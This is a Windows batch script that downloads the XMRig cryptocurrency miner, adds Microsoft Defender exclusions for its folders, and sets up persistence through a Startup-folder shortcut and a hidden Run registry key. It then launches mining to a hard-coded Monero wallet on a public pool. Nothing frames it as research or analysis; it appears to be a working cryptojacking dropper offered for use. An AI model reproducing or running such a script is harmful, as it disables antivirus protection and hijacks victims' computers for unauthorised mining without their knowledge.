@echo off
setlocal

:: === Settings ===
set "DOWNLOAD_URL=https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
set "ZIP_NAME=xmrig.zip"
set "FOLDER_NAME=xmrig"
set "TARGET_NAME=xmrig"

REM UAC
cmd /C "set __COMPAT_LAYER=RUNASINVOKER && start "" %1" 

:: === Add Defender exclusion ===
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$targetName = '%TARGET_NAME%'; ^
$folders = Get-ChildItem -Path 'C:\' -Recurse -Directory -ErrorAction SilentlyContinue ^| Where-Object { $_.Name -eq $targetName }; ^
foreach ($folder in $folders) { Add-MpPreference -ExclusionPath $folder.FullName }"

:: === Download ===
echo Downloading...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%ZIP_NAME%'"

:: === Add Defender exclusion ===
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$targetName = '%TARGET_NAME%'; ^
$folders = Get-ChildItem -Path 'C:\' -Recurse -Directory -ErrorAction SilentlyContinue ^| Where-Object { $_.Name -eq $targetName }; ^
foreach ($folder in $folders) { Add-MpPreference -ExclusionPath $folder.FullName }"

REM Get the full path of the currently running batch file
set "TARGET_BAT=%~f0"

REM Get the current user's Startup folder path
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM Name of the shortcut to create
set "SHORTCUT_NAME=Startup.lnk"

REM Create a shortcut in the Startup folder using PowerShell
powershell -NoProfile -Command ^
    "$ws = New-Object -ComObject WScript.Shell; ^
    $s = $ws.CreateShortcut('%STARTUP_FOLDER%\%SHORTCUT_NAME%'); ^
    $s.TargetPath = '%TARGET_BAT%'; ^
    $s.WorkingDirectory = Split-Path '%TARGET_BAT%'; ^
    $s.Save()"

:: === Extract ===
echo Extracting...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Expand-Archive -Path '%ZIP_NAME%' -DestinationPath '%FOLDER_NAME%' -Force"

:: === Enter folder ===
echo Enter
cd /d "%~dp0\xmrig"

for /d %%i in (*) do (
    cd "%%i"
    goto found
)

:found
dir xmrig.exe

echo Starting...

xmrig.exe -o pool.supportxmr.com:443 -u 441qAPmYrqYjmAnip6JVf6MmgxR3xSKGSBHKfTHDvdD5bvMX4oj4FgkAKmqsqnjPN21ncqiMXF5ZWdrUaS8TNAVG2BGYAKs -p x -k --tls 

powershell -Command "Start-Process 'powershell' -ArgumentList 'REG ADD ''HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'' /v ''xmrig'' /t REG_SZ /d ''%~dp0%v.0.1.0.bat'' /f' -WindowStyle Hidden"

